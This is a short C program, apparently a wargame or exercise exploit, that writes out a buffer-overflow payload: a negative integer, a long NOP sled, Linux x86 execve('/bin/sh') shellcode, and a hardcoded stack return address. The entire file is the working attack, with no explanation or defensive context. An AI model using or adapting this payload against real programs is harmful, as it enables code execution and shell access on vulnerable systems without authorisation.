#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 200

void main(){


char shellcode[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";


int i=0;
printf("-2147483119,");
for(i=0; i<10500; i++){
        printf("\x90");
}

printf("%s", shellcode);

for(i=0; i<19; i++){
        printf("\x90");
}

printf("\x60\xce\xff\xbf");

for(i=0; i<32; i++){
        printf("\x90");
}

}

